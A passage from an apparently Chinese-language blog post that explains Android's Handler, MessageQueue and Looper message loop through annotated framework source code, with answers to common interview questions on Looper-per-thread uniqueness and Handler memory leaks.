false.</span></span><br><span class="line">            <span class="keyword">if</span> (needWake) &#123;</span><br><span class="line">                nativeWake(mPtr);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里发消息基本完成，后面看如何取消息。<br>next() 中返回一个 Message。<br><strong>frameworks/base/core/java/android/os/MessageQueue.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">MessageQueue</span> &#123;</span><br><span class="line">    Message <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// Return here if the message loop has already quit and been disposed.</span></span><br><span class="line">        <span class="comment">// This can happen if the application tries to restart a looper after quit</span></span><br><span class="line">        <span class="comment">// which is not supported.</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">long</span> <span class="variable">ptr</span> <span class="operator">=</span> mPtr;</span><br><span class="line">        <span class="keyword">if</span> (ptr == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">pendingIdleHandlerCount</span> <span class="operator">=</span> -<span class="number">1</span>; <span class="comment">// -1 only during first iteration</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">nextPollTimeoutMillis</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;  <span class="comment">// 死循环，</span></span><br><span class="line">            <span class="keyword">if</span> (nextPollTimeoutMillis != <span class="number">0</span>) &#123;</span><br><span class="line">                Binder.flushPendingCommands();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// nextPollTimeoutMillis ：-1 表示无限等待，直到有事件为止；0 表示立即执行；其他数字表示等待多时毫秒。</span></span><br><span class="line">            <span class="comment">// linux 层休眠等待，</span></span><br><span class="line">            nativePollOnce(ptr, nextPollTimeoutMillis);</span><br><span class="line">            <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">                <span class="comment">// Try to retrieve the next message.  Return if found.</span></span><br><span class="line">                <span class="keyword">final</span> <span class="type">long</span> <span class="variable">now</span> <span class="operator">=</span> SystemClock.uptimeMillis();</span><br><span class="line">                <span class="type">Message</span> <span class="variable">prevMsg</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="comment">// 拿到队列对头消息</span></span><br><span class="line">                <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> mMessages;</span><br><span class="line">                <span class="keyword">if</span> (msg != <span class="literal">null</span> &amp;&amp; msg.target == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// Stalled by a barrier.  Find the next asynchronous message in the queue.</span></span><br><span class="line">                    <span class="keyword">do</span> &#123;</span><br><span class="line">                        prevMsg = msg;</span><br><span class="line">                        msg = msg.next;</span><br><span class="line">                    &#125; <span class="keyword">while</span> (msg != <span class="literal">null</span> &amp;&amp; !msg.isAsynchronous());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (msg != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 跟当前时间对比</span></span><br><span class="line">                    <span class="keyword">if</span> (now &lt; msg.when) &#123;</span><br><span class="line">                        <span class="comment">// 队列中，第一个节点还没到可以执行的时刻，则等待。</span></span><br><span class="line">                        <span class="comment">// Next message is not ready.  Set a timeout to wake up when it is ready.</span></span><br><span class="line">                        nextPollTimeoutMillis = (<span class="type">int</span>) Math.min(msg.when - now, Integer.MAX_VALUE);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;  <span class="comment">// 到了可以执行的时间，则把消息 return 出去。</span></span><br><span class="line">                        <span class="comment">// Got a message.</span></span><br><span class="line">                        mBlocked = <span class="literal">false</span>;</span><br><span class="line">                        <span class="keyword">if</span> (prevMsg != <span class="literal">null</span>) &#123;</span><br><span class="line">                            prevMsg.next = msg.next;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            mMessages = msg.next;</span><br><span class="line">                        &#125;</span><br><span class="line">                        msg.next = <span class="literal">null</span>;</span><br><span class="line">                        <span class="keyword">if</span> (DEBUG) Log.v(TAG, <span class="string">&quot;Returning message: &quot;</span> + msg);</span><br><span class="line">                        msg.markInUse();</span><br><span class="line">                        <span class="keyword">return</span> msg;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// No more messages.</span></span><br><span class="line">                    nextPollTimeoutMillis = -<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// Process the quit message now that all pending messages have been handled.</span></span><br><span class="line">                <span class="keyword">if</span> (mQuitting) &#123;</span><br><span class="line">                    dispose();</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// If first time idle, then get the number of idlers to run.</span></span><br><span class="line">                <span class="comment">// Idle handles only run if the queue is empty or if the first message</span></span><br><span class="line">                <span class="comment">// in the queue (possibly a barrier) is due to be handled in the future.</span></span><br><span class="line">                <span class="keyword">if</span> (pendingIdleHandlerCount &lt; <span class="number">0</span></span><br><span class="line">                        &amp;&amp; (mMessages == <span class="literal">null</span> || now &lt; mMessages.when)) &#123;</span><br><span class="line">                    pendingIdleHandlerCount = mIdleHandlers.size();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (pendingIdleHandlerCount &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">// No idle handlers to run.  Loop and wait some more.</span></span><br><span class="line">                    mBlocked = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (mPendingIdleHandlers == <span class="literal">null</span>) &#123;</span><br><span class="line">                    mPendingIdleHandlers = <span class="keyword">new</span> <span class="title class_">IdleHandler</span>[Math.max(pendingIdleHandlerCount, <span class="number">4</span>)];</span><br><span class="line">                &#125;</span><br><span class="line">                mPendingIdleHandlers = mIdleHandlers.toArray(mPendingIdleHandlers);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Run the idle handlers.</span></span><br><span class="line">            <span class="comment">// We only ever reach this code block during the first iteration.</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; pendingIdleHandlerCount; i++) &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">IdleHandler</span> <span class="variable">idler</span> <span class="operator">=</span> mPendingIdleHandlers[i];</span><br><span class="line">                mPendingIdleHandlers[i] = <span class="literal">null</span>; <span class="comment">// release the reference to the handler</span></span><br><span class="line">                <span class="type">boolean</span> <span class="variable">keep</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    keep = idler.queueIdle();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                    Log.wtf(TAG, <span class="string">&quot;IdleHandler threw exception&quot;</span>, t);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!keep) &#123;</span><br><span class="line">                    <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">                        mIdleHandlers.remove(idler);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Reset the idle handler count to 0 so we do not run them again.</span></span><br><span class="line">            pendingIdleHandlerCount = <span class="number">0</span>;</span><br><span class="line">            <span class="comment">// While calling an idle handler, a new message could have been delivered</span></span><br><span class="line">            <span class="comment">// so go back and look again for a pending message without waiting.</span></span><br><span class="line">            nextPollTimeoutMillis = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到此，消息取出来了，但是谁取的呢？这就涉及到另一个重要的类 Looper</p><h4 id="Looper"><a href="#Looper" class="headerlink" title="Looper"></a>Looper</h4><p>Looper.loop() 里面会有个for循环，且是个死循环，会不断的调用 MessageQueue#next() 方法。<br><strong>frameworks/base/core/java/android/os/Looper.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Looper</span> &#123;</span><br><span class="line">     <span class="comment">// 初始化Looper </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">prepare</span><span class="params">()</span> &#123;</span><br><span class="line">        prepare(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">prepare</span><span class="params">(<span class="type">boolean</span> quitAllowed)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (sThreadLocal.get() != <span class="literal">null</span>) &#123;  <span class="comment">// 如果该线程有 Looper，则抛出一个异常。</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Only one Looper may be created per thread&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 这里使用了 ThreadLocal，保证了一个线程只有一个Looper。</span></span><br><span class="line">        sThreadLocal.set(<span class="keyword">new</span> <span class="title class_">Looper</span>(quitAllowed));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">loop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Looper</span> <span class="variable">me</span> <span class="operator">=</span> myLooper();</span><br><span class="line">        <span class="keyword">if</span> (me == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;No Looper; Looper.prepare() wasn&#x27;t called on this thread.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (me.mInLoop) &#123;</span><br><span class="line">            Slog.w(TAG, <span class="string">&quot;Loop again would have the queued messages be executed&quot;</span></span><br><span class="line">                    + <span class="string">&quot; before this one completed.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        me.mInLoop = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// Make sure the identity of this thread is that of the local process,</span></span><br><span class="line">        <span class="comment">// and keep track of what that identity token actually is.</span></span><br><span class="line">        Binder.clearCallingIdentity();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">long</span> <span class="variable">ident</span> <span class="operator">=</span> Binder.clearCallingIdentity();</span><br><span class="line">        <span class="comment">// Allow overriding a threshold with a system prop. e.g.</span></span><br><span class="line">        <span class="comment">// adb shell &#x27;setprop log.looper.1000.main.slow 1 &amp;&amp; stop &amp;&amp; start&#x27;</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">thresholdOverride</span> <span class="operator">=</span></span><br><span class="line">                SystemProperties.getInt(<span class="string">&quot;log.looper.&quot;</span></span><br><span class="line">                        + Process.myUid() + <span class="string">&quot;.&quot;</span></span><br><span class="line">                        + Thread.currentThread().getName()</span><br><span class="line">                        + <span class="string">&quot;.slow&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        me.mSlowDeliveryDetected = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;  <span class="comment">// 死循环</span></span><br><span class="line">            <span class="comment">// 不断地调用mQueue.next()</span></span><br><span class="line">            <span class="keyword">if</span> (!loopOnce(me, ident, thresholdOverride)) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">loopOnce</span><span class="params">(<span class="keyword">final</span> Looper me,</span></span><br><span class="line"><span class="params">            <span class="keyword">final</span> <span class="type">long</span> ident, <span class="keyword">final</span> <span class="type">int</span> thresholdOverride)</span> &#123;</span><br><span class="line">        <span class="comment">// 这里如果此时队列中没有消息或队列中，第一个节点还没到可以执行的时刻，则会进入等待，block 状态。</span></span><br><span class="line">        <span class="comment">// 会一直在这等，该等待是Linux层做的，在 mQueue.next()中</span></span><br><span class="line">        <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> me.mQueue.next(); <span class="comment">// might block</span></span><br><span class="line">        <span class="keyword">if</span> (msg == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// No message indicates that the message queue is quitting.</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// This must be in a local variable, in case a UI event sets the logger</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Printer</span> <span class="variable">logging</span> <span class="operator">=</span> me.mLogging;</span><br><span class="line">        <span class="comment">// Make sure the observer won&#x27;t change while processing a transaction.</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Observer</span> <span class="variable">observer</span> <span class="operator">=</span> sObserver;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">long</span> <span class="variable">traceTag</span> <span class="operator">=</span> me.mTraceTag;</span><br><span class="line">        <span class="type">long</span> <span class="variable">slowDispatchThresholdMs</span> <span class="operator">=</span> me.mSlowDispatchThresholdMs;</span><br><span class="line">        <span class="type">long</span> <span class="variable">slowDeliveryThresholdMs</span> <span class="operator">=</span> me.mSlowDeliveryThresholdMs;</span><br><span class="line">        <span class="keyword">if</span> (thresholdOverride &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            slowDispatchThresholdMs = thresholdOverride;</span><br><span class="line">            slowDeliveryThresholdMs = thresholdOverride;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">logSlowDelivery</span> <span class="operator">=</span> (slowDeliveryThresholdMs &gt; <span class="number">0</span>) &amp;&amp; (msg.when &gt; <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">logSlowDispatch</span> <span class="operator">=</span> (slowDispatchThresholdMs &gt; <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">needStartTime</span> <span class="operator">=</span> logSlowDelivery || logSlowDispatch;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">needEndTime</span> <span class="operator">=</span> logSlowDispatch;</span><br><span class="line">        <span class="keyword">if</span> (traceTag != <span class="number">0</span> &amp;&amp; Trace.isTagEnabled(traceTag)) &#123;</span><br><span class="line">            Trace.traceBegin(traceTag, msg.target.getTraceName(msg));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">long</span> <span class="variable">dispatchStart</span> <span class="operator">=</span> needStartTime ? SystemClock.uptimeMillis() : <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">long</span> dispatchEnd;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">token</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (observer != <span class="literal">null</span>) &#123;</span><br><span class="line">            token = observer.messageDispatchStarting();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="variable">origWorkSource</span> <span class="operator">=</span> ThreadLocalWorkSource.setUid(msg.workSourceUid);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取到消息后，就会调用 msg.target.dispatchMessage(msg)，即回调 handler#dispatchMessage(msg)</span></span><br><span class="line">            <span class="comment">// msg.target 为 handler对象</span></span><br><span class="line">            msg.target.dispatchMessage(msg);</span><br><span class="line">            <span class="keyword">if</span> (observer != <span class="literal">null</span>) &#123;</span><br><span class="line">                observer.messageDispatched(token, msg);</span><br><span class="line">            &#125;</span><br><span class="line">            dispatchEnd = needEndTime ? SystemClock.uptimeMillis() : <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">            <span class="keyword">if</span> (observer != <span class="literal">null</span>) &#123;</span><br><span class="line">                observer.dispatchingThrewException(token, msg, exception);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> exception;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            ThreadLocalWorkSource.restore(origWorkSource);</span><br><span class="line">            <span class="keyword">if</span> (traceTag != <span class="number">0</span>) &#123;</span><br><span class="line">                Trace.traceEnd(traceTag);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (logSlowDelivery) &#123;</span><br><span class="line">            <span class="keyword">if</span> (me.mSlowDeliveryDetected) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((dispatchStart - msg.when) &lt;= <span class="number">10</span>) &#123;</span><br><span class="line">                    Slog.w(TAG, <span class="string">&quot;Drained&quot;</span>);</span><br><span class="line">                    me.mSlowDeliveryDetected = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (showSlowLog(slowDeliveryThresholdMs, msg.when, dispatchStart, <span class="string">&quot;delivery&quot;</span>,</span><br><span class="line">                        msg)) &#123;</span><br><span class="line">                    <span class="comment">// Once we write a slow delivery log, suppress until the queue drains.</span></span><br><span class="line">                    me.mSlowDeliveryDetected = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (logSlowDispatch) &#123;</span><br><span class="line">            showSlowLog(slowDispatchThresholdMs, dispatchStart, dispatchEnd, <span class="string">&quot;dispatch&quot;</span>, msg);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (logging != <span class="literal">null</span>) &#123;</span><br><span class="line">            logging.println(<span class="string">&quot;&lt;&lt;&lt;&lt;&lt; Finished to &quot;</span> + msg.target + <span class="string">&quot; &quot;</span> + msg.callback);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Make sure that during the course of dispatching the</span></span><br><span class="line">        <span class="comment">// identity of the thread wasn&#x27;t corrupted.</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">long</span> <span class="variable">newIdent</span> <span class="operator">=</span> Binder.clearCallingIdentity();</span><br><span class="line">        <span class="keyword">if</span> (ident != newIdent) &#123;</span><br><span class="line">            Log.wtf(TAG, <span class="string">&quot;Thread identity changed from 0x&quot;</span></span><br><span class="line">                    + Long.toHexString(ident) + <span class="string">&quot; to 0x&quot;</span></span><br><span class="line">                    + Long.toHexString(newIdent) + <span class="string">&quot; while dispatching to &quot;</span></span><br><span class="line">                    + msg.target.getClass().getName() + <span class="string">&quot; &quot;</span></span><br><span class="line">                    + msg.callback + <span class="string">&quot; what=&quot;</span> + msg.what);</span><br><span class="line">        &#125;</span><br><span class="line">        msg.recycleUnchecked();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当获取到消息时，回调用 <strong>msg.target.dispatchMessage(msg)</strong> 即 **handler#dispatchMessage(msg)**，在 <strong>dispatchMessage(msg)</strong> 中再回调 <strong>handleMessage(msg)</strong> ，这样就收到消息。至此发消息、收消息整个流程结束。<br>下面回答上述的问题。</p><p>1.一个线程有几个Handler？<br>答：那个，new 多少就有多少。</p><p>2.一个线程有几个Looper？如何保证？<br>答：一个，在初始化时，使用了 ThreadLocal ，而 ThreadLocal 是一个 &lt;key,value&gt; 这种形式的变量，类似 hashMap。它的 key 是当前线程，value 是 Looper。<br>下方为对应源码分析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化Looper </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">prepare</span><span class="params">()</span> &#123;</span><br><span class="line">prepare(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">prepare</span><span class="params">(<span class="type">boolean</span> quitAllowed)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (sThreadLocal.get() != <span class="literal">null</span>) &#123;  <span class="comment">// 如果该线程有 Looper，则抛出一个异常。</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Only one Looper may be created per thread&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 这里使用了 ThreadLocal，保证了一个线程只有一个Looper。</span></span><br><span class="line">sThreadLocal.set(<span class="keyword">new</span> <span class="title class_">Looper</span>(quitAllowed));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ThreadLocal 的 set() 方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(T value)</span> &#123;</span><br><span class="line"><span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> Thread.currentThread();  <span class="comment">// 当前线程</span></span><br><span class="line"><span class="type">ThreadLocalMap</span> <span class="variable">map</span> <span class="operator">=</span> getMap(t);</span><br><span class="line"><span class="keyword">if</span> (map != <span class="literal">null</span>)</span><br><span class="line">map.set(<span class="built_in">this</span>, value);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">createMap(t, value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ThreadLocal 的 get()方法，</span></span><br><span class="line"><span class="keyword">public</span> T <span class="title function_">get</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> Thread.currentThread();  <span class="comment">// 当前线程</span></span><br><span class="line"><span class="type">ThreadLocalMap</span> <span class="variable">map</span> <span class="operator">=</span> getMap(t);</span><br><span class="line"><span class="keyword">if</span> (map != <span class="literal">null</span>) &#123;</span><br><span class="line">ThreadLocalMap.<span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> map.getEntry(<span class="built_in">this</span>);</span><br><span class="line"><span class="keyword">if</span> (e != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="type">T</span> <span class="variable">result</span> <span class="operator">=</span> (T)e.value;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> setInitialValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.Handler 内存泄漏原因？为什么其他的内部分没有过这个问题？<br>出现内存泄漏的情况：Activity 销毁时，存在待处理的消息。例如：发送一个delay(延迟消息) 2s，在2s内销毁界面。<br>答：Handler 持有 Activity 的上下文，而 MessageQueue 持有 Message，Message 又持有 Handler；只有当这消息被处理时，才会去销毁对应的 Handler ，Handler 被销毁了，才会去销毁持有的上下文。而其他内部类，例如：RecyclerView 的 ViewHolder，不会产生内存泄漏，因为它没有被其它地方持有该内部类。<br><strong>frameworks/base/core/java/android/os/Handler.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 